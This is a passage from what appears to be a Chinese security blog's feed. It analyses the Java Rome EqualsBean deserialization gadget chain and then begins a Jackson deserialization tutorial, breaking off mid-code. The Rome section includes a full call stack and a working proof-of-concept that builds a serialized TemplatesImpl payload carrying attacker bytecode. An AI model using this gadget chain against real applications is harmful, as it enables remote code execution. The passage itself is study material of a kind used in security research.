src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735284805014-b6da1187-b55b-477c-a96d-87fcbff95147.png"></p><p>è¿™é‡Œçš„å…¥å£ç‚¹hashMapæ˜¯å¯ä»¥æ›´æ”¹çš„ç„¶åä¸­é—´çš„ObejctBeanè¿˜æœ‰EqualsBeanéƒ½å¯ä»¥çµæ´»æ­é…ä½¿ç”¨ã€‚</p><h2 id="EqualsBeané“¾"><a href="#EqualsBeané“¾" class="headerlink" title="EqualsBeané“¾"></a>EqualsBeané“¾</h2><p>è¿™æ¡é“¾çš„ä¸»è¦å…³é”®ç‚¹åœ¨äºEqualsBeanç±»ä¸­å­˜åœ¨ä¸€ä¸ªæ–¹æ³•æ˜¯beanEqualsæ–¹æ³•æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735286386895-e0d90746-e2ef-4970-8e81-d7fe65e79e2d.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ä»–å’ŒToStringBeanç±»çš„tostringæ–¹æ³•å¾ˆåƒä¹Ÿæ˜¯å¯ä»¥ä»»æ„è°ƒç”¨getteræ–¹æ³•çš„ï¼Œæ‰€ä»¥å…¶å®è¿™é‡Œå…³é”®ç‚¹å°±æ˜¯æ‰¾åˆ°è°èƒ½å¤Ÿè°ƒç”¨äº†è¿™ä¸ªbeanEqualsæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735286514936-79102317-a611-4a73-82e0-1204a4d5f969.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨ä»–åŒç±»ä¸‹çš„equalsæ–¹æ³•è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œå‰é¢åœ¨åˆ†æè§¦å‘toStringæ–¹æ³•æ—¶æåˆ°è¿‡ä½¿ç”¨equalsæ–¹æ³•è¿›è¡Œè§¦å‘</p><p>æ‰€ä»¥ä¸‹é¢å°±æ˜¯å¯»æ‰¾è°ƒç”¨equalsæ–¹æ³•çš„åœ°æ–¹ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735287426398-10c5ef84-1068-4228-aaf4-c16baa165db7.png"></p><p>åœ¨HashMapçš„çˆ¶ç±»AbstractMapç±»ä¸­çš„equalsæ–¹æ³•ä¸­è°ƒç”¨äº†equalsæ–¹æ³•</p><p>æ‰€ä»¥å¯ä»¥æ„é€ å‡ºæ¥payloadï¼Œå¸ˆå‚…å¯ä»¥è‡ªå·±æ ¹æ®pocçš„è°ƒç”¨æ ˆå»åˆ†æèƒ½æ›´å¥½æ‡‚ä¸€ç‚¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">beanEquals:<span class="number">146</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">equals:<span class="number">103</span>, EqualsBean (com.sun.syndication.feed.impl)</span><br><span class="line">equals:<span class="number">472</span>, AbstractMap (java.util)</span><br><span class="line">putVal:<span class="number">634</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">DeSerialize:<span class="number">54</span>, Remo_EqualsBean (com.ocean)</span><br><span class="line">main:<span class="number">45</span>, Remo_EqualsBean (com.ocean)</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç»™å‡ºpoc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Remo_EqualsBean</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Rome_stu/src/main/java/Exp.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(String.class, <span class="string">&quot;s&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;yy&quot;</span>, bean);</span><br><span class="line">        map1.put(<span class="string">&quot;zZ&quot;</span>, templatesimpl);</span><br><span class="line">        map2.put(<span class="string">&quot;zZ&quot;</span>, bean);</span><br><span class="line">        map2.put(<span class="string">&quot;yy&quot;</span>, templatesimpl);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">table</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        table.add(map1);</span><br><span class="line">        table.add(map2);</span><br><span class="line"></span><br><span class="line">        setValue(bean, <span class="string">&quot;_beanClass&quot;</span>, Templates.class);</span><br><span class="line">        setValue(bean, <span class="string">&quot;_obj&quot;</span>, templatesimpl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Serialize(table);</span><br><span class="line">        DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">DeSerialize</span><span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(s));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735288986252-7703d93d-bd42-4ec3-bf1e-48abadd4b26c.png"></p><p>å…¶å®è¿™é‡Œå…·ä½“ä¸ºä»€ä¹ˆè¦putä¸¤æ¬¡mapå‘¢æˆ‘ä¸ªäººçš„çœ‹æ³•ï¼Œå°±æ˜¯åœ¨putValè¿™ä¸ªæ–¹æ³•é‡Œä¸ºäº†æ»¡è¶³è¿™ä¸ªåˆ¤æ–­æ¡ä»¶å°±æ˜¯è¦keyçš„hashå€¼ç›¸ç­‰ã€‚</p><p><strong>æ³¨</strong>ï¼šè¿™é‡Œçš„HashMapã€HashSetã€HashTableéƒ½å¯ä»¥ç›¸äº’æ›¿æ¢å‚è€ƒï¼š<a href="https://goodapple.top/archives/1145">https://goodapple.top/archives/1145</a></p><p><a href="https://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/">https://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/</a></p><p>Romeååºåˆ—åŒ–</p>]]></content>
      
      
      <categories>
          
          <category> Javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Rome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jacksonååºåˆ—åŒ–</title>
      <link href="/2024/12/30/Java%E5%AE%89%E5%85%A8/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/12/30/Java%E5%AE%89%E5%85%A8/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>è¿™é‡Œç›´æ¥å¼•ç”¨åˆ«çš„å¸ˆå‚…çš„</p><p>Jacksonæ˜¯ä¸€ä¸ªæµè¡Œçš„Javaåº“ï¼Œç”¨äºå¤„ç†JSONæ ¼å¼çš„æ•°æ®ã€‚å®ƒæä¾›äº†ä¸€ç»„åŠŸèƒ½å¼ºå¤§çš„å·¥å…·ï¼Œå¯ä»¥æ–¹ä¾¿åœ°åœ¨Javaå¯¹è±¡å’ŒJSONä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚ä»¥ä¸‹æ˜¯å…³äºJacksonåº“çš„ä»‹ç»ï¼š</p><p>Jacksonåº“åŒ…æ‹¬ä¸‰ä¸ªä¸»è¦çš„æ¨¡å—ï¼š<code>jackson-databind</code>ã€<code>jackson-annotations</code>å’Œ<code>jackson-core</code>ã€‚</p><ol><li><code>jackson-databind</code>æ¨¡å—ï¼šè¿™æ˜¯Jacksonåº“çš„æ ¸å¿ƒæ¨¡å—ï¼Œæä¾›äº†å°†Javaå¯¹è±¡åºåˆ—åŒ–ä¸ºJSONæ ¼å¼ä»¥åŠå°†JSONæ ¼å¼ååºåˆ—åŒ–ä¸ºJavaå¯¹è±¡çš„åŠŸèƒ½ã€‚å®ƒåŒ…å«äº†<code>ObjectMapper</code>ç±»ï¼Œç”¨äºæ‰§è¡Œå¯¹è±¡å’ŒJSONä¹‹é—´çš„è½¬æ¢æ“ä½œï¼Œä»¥åŠä¸€äº›æ³¨è§£ï¼ˆå¦‚<code>@JsonProperty</code>ã€<code>@JsonIgnore</code>ç­‰ï¼‰ï¼Œç”¨äºæ§åˆ¶å¯¹è±¡å’ŒJSONå±æ€§ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚</li><li><code>jackson-annotations</code>æ¨¡å—ï¼šè¿™ä¸ªæ¨¡å—åŒ…å«äº†ä¸€äº›ç”¨äºå¯¹Javaå¯¹è±¡è¿›è¡Œæ ‡è®°çš„æ³¨è§£ï¼Œç”¨äºæŒ‡ç¤ºJacksonåº“å¦‚ä½•å¤„ç†å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚è¿™äº›æ³¨è§£ä½¿å¾—å¼€å‘äººå‘˜å¯ä»¥åœ¨å¯¹è±¡ä¸Šæ–¹ä¾¿åœ°å®šä¹‰ä¸JSONæ˜ å°„ç›¸å…³çš„ä¿¡æ¯ï¼Œä¾‹å¦‚æŒ‡å®šå±æ€§åã€å¿½ç•¥æŸäº›å±æ€§ç­‰ã€‚</li><li><code>jackson-core</code>æ¨¡å—ï¼šè¿™ä¸ªæ¨¡å—æä¾›äº†ç”¨äºå¤„ç†JSONæ•°æ®çš„ä½çº§APIï¼Œä¾‹å¦‚è¯»å–å’Œå†™å…¥JSONæµã€æ„å»ºJSONæ ‘ç»“æ„ç­‰ã€‚è™½ç„¶å¤§å¤šæ•°å¼€å‘äººå‘˜æ›´å€¾å‘äºä½¿ç”¨<code>jackson-databind</code>æ¨¡å—ï¼Œä½†åœ¨ä¸€äº›ç‰¹å®šçš„åœºæ™¯ä¸‹ï¼Œç›´æ¥ä½¿ç”¨<code>jackson-core</code>æ¨¡å—ä¹Ÿæ˜¯éå¸¸æœ‰ç”¨çš„ã€‚</li></ol><p>Jackson åŠŸèƒ½å¾ˆå¼ºå¤§ï¼Œæ—¢èƒ½æ»¡è¶³ç®€å•çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œï¼Œä¹Ÿèƒ½å®ç°å¤æ‚çš„ã€ä¸ªæ€§åŒ–çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼ŒJackson çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ€§èƒ½éƒ½éå¸¸ä¼˜ç§€ï¼Œå·²ç»æ˜¯å›½å†…å¤–å¤§éƒ¨åˆ† JSON ç›¸å…³ç¼–ç¨‹çš„é¦–é€‰å·¥å…·ã€‚Jacksonä» 2.0 å¼€å§‹æ”¹ç”¨æ–°çš„åŒ…å fasterxmlï¼Œ1.x ç‰ˆæœ¬çš„åŒ…åæ˜¯ codehausã€‚é™¤äº†åŒ…åä¸åŒï¼Œä»–ä»¬çš„ Maven artifact id ä¹Ÿä¸åŒã€‚1.x ç‰ˆæœ¬ç°åœ¨åªæä¾› bug-fixï¼Œè€Œ 2.x ç‰ˆæœ¬è¿˜åœ¨ä¸æ–­å¼€å‘å’Œå‘å¸ƒä¸­ã€‚å¦‚æœæ˜¯æ–°é¡¹ç›®ï¼Œå»ºè®®ç›´æ¥ç”¨ 2xï¼Œå³ fasterxml jacksonã€‚</p><h2 id="åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        Person zbz = new Person(<span class="number">22</span>, <span class="string">&quot;zbz&quot;</span>);</span><br><span class="line">        ObjectMapper objectMapper = new ObjectMapper();</span><br><span class="line">        //åºåˆ—åŒ–</span><br><span class="line">        String s = objectMapper.writeValueAsString(zbz);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        //ååºåˆ—åŒ–</span><br><span class="line">        String jack = <span class="string">&quot;&#123;\&quot;age\&quot;:22,\&quot;name\&quot;:\&quot;zbz\&quot;&#125;&quot;</span>;</span><br><span class="line">        Person person = objectMapper.readValue(jack, Person.<span class="keyword">class</span>);</span><br><span class="line">        System.out.println(person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//è¾“å‡º</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="number">22</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zbz&quot;</span>&#125;</span><br><span class="line"><span class="number">22</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªæ˜¯ç®€å•çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</p><h2 id="å¤šæ€é—®é¢˜çš„è§£å†³"><a href="#å¤šæ€é—®é¢˜çš„è§£å†³" class="headerlink" title="å¤šæ€é—®é¢˜çš„è§£å†³"></a>å¤šæ€é—®é¢˜çš„è§£å†³</h2><p>ç›´æ¥å¼•ç”¨<a href="http://www.mi1k7ea.com/">Mi1k7ea</a>å¸ˆå‚…çš„è§£é‡Š</p><p>ç®€å•åœ°è¯´ï¼ŒJavaå¤šæ€å°±æ˜¯åŒä¸€ä¸ªæ¥å£ä½¿ç”¨ä¸åŒçš„å®ä¾‹è€Œæ‰§è¡Œä¸åŒçš„æ“ä½œã€‚</p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚æœå¯¹å¤šæ€ç±»çš„æŸä¸€ä¸ªå­ç±»å®ä¾‹åœ¨åºåˆ—åŒ–åå†è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå¦‚ä½•èƒ½å¤Ÿä¿è¯ååºåˆ—åŒ–å‡ºæ¥çš„å®ä¾‹å³æ˜¯æˆ‘ä»¬æƒ³è¦çš„é‚£ä¸ªç‰¹å®šå­ç±»çš„å®ä¾‹è€Œéå¤šæ€ç±»çš„å…¶ä»–å­ç±»å®ä¾‹å‘¢ï¼Ÿâ€”â€”Jacksonå®ç°äº†JacksonPolymorphicDeserializationæœºåˆ¶æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><p>JacksonPolymorphicDeserializationå³Jacksonå¤šæ€ç±»å‹çš„ååºåˆ—åŒ–ï¼šåœ¨ååºåˆ—åŒ–æŸä¸ªç±»å¯¹è±¡çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœç±»çš„æˆå‘˜å˜é‡ä¸æ˜¯å…·ä½“ç±»å‹ï¼ˆnon-concreteï¼‰ï¼Œæ¯”å¦‚Objectã€æ¥å£æˆ–æŠ½è±¡ç±»ï¼Œåˆ™å¯ä»¥åœ¨JSONå­—ç¬¦ä¸²ä¸­æŒ‡å®šå…¶å…·ä½“ç±»å‹ï¼ŒJacksonå°†ç”Ÿæˆå…·ä½“ç±»å‹çš„å®ä¾‹ã€‚</p><p>ç®€å•åœ°è¯´ï¼Œå°±æ˜¯å°†å…·ä½“çš„å­ç±»ä¿¡æ¯ç»‘å®šåœ¨åºåˆ—åŒ–çš„å†…å®¹ä¸­ä»¥ä¾¿äºåç»­ååºåˆ—åŒ–çš„æ—¶å€™ç›´æ¥å¾—åˆ°ç›®æ ‡å­ç±»å¯¹è±¡ï¼Œå…¶å®ç°æœ‰ä¸¤ç§ï¼Œå³DefaultTypingå’Œ@JsonTypeInfoæ³¨è§£ã€‚</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>Jacksonæä¾›ä¸€ä¸ªenableDefaultTypingè®¾ç½®ï¼Œå…¶åŒ…å«4ä¸ªå€¼ï¼ŒæŸ¥çœ‹jackson-databind-2.7.9.jar!&#x2F;com&#x2F;fasterxml&#x2F;jackson&#x2F;databind&#x2F;ObjectMapper.javaå¯çœ‹åˆ°ç›¸å…³ä»‹ç»ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">DefaultTyping</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * This value means that only properties that have</span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including</span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default</span></span><br><span class="line"><span class="comment">        * typing.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    JAVA_LANG_OBJECT,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;</span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).</span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    OBJECT_AND_NON_CONCRETE,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;</span></span><br><span class="line"><span class="comment">        * plus all array types for them.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    NON_CONCRETE_AND_ARRAYS,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for</span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of</span></span><br><span class="line"><span class="comment">        * &quot;natural&quot; types (String, Boolean, Integer, Double), which</span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for</span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.</span></span><br><span class="line"><span class="comment">        *&lt;p&gt;</span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    NON_FINAL</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå³æ— å‚æ•°çš„enableDefaultTypingæ˜¯ç¬¬äºŒä¸ªè®¾ç½®ï¼ŒOBJECT_AND_NON_CONCRETEã€‚</p><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>å½“è¢«åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–çš„ç±»é‡Œçš„å±æ€§è¢«å£°æ˜ä¸ºä¸€ä¸ªObjectç±»å‹æ—¶ï¼Œä¼šå¯¹è¯¥Objectç±»å‹çš„å±æ€§è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œå¹¶ä¸”æ˜ç¡®è§„å®šç±»åã€‚ï¼ˆå½“ç„¶ï¼Œè¿™ä¸ªObjectæœ¬èº«ä¹Ÿå¾—æ˜¯ä¸€ä¸ªå¯è¢«åºåˆ—åŒ–çš„ç±»ï¼‰</p><p>åŠ å…¥ä¸€ä¸ªæµ‹è¯•ç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734963587128-3055166e-02cf-497e-8cc6-2880903b8e08.png"></p><p>æ”¹ä¸€ä¸‹Personçš„å±æ€§</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1734963594917-511d7ad6-f33a-4528-a310-87ef2a798e59.png"></p><p>æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">zbz</span> <span class="variable">zbz1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">zbz</span>();</span><br><span class="line">        <span class="type">Person</span> <span class="variable">ocean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="number">22</span>, <span 